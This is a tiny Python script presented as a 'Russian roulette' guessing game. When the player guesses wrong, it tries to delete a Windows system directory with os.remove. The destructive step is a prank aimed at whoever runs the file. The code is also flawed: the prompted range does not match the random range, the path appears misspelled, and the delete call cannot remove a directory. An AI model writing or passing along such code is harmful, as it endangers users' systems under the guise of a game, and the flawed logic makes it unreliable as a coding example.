import random
import os

number = random.randint(0,7)                  #1-6 tradictional russian roulette :))
guess = int(input("Guess a number between 1 and 10: "))
guess = int(guess)

if guess == number:
	print("You won!")
else :
	os.remove("C:\Windows\System2")